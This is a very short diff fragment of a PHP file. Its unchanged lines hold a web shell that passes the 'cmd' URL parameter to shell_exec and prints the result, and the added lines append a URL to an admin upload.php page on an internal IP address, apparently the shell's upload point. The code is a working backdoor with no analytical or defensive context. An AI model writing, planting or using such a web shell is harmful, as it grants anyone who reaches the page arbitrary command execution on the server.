@@ -3,3 +3,6 @@ if(isset($_GET['cmd'])) {
     echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
 }
 ?>
+
+
+http://10.49.129.171/admin/upload.php
